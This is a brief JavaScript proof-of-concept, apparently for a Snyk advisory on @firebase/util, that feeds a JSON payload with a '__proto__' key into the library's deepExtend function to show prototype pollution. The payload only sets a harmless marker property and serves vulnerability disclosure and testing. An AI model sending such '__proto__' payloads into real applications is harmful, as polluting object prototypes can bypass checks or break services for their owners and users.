//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
 
   

  const util = require("@firebase/util");
  var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  const a = {
    nest: {
      number: 1,
      string: "1",
      object: { key: "1" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  var result = util.deepExtend(a, payload);
// End of file
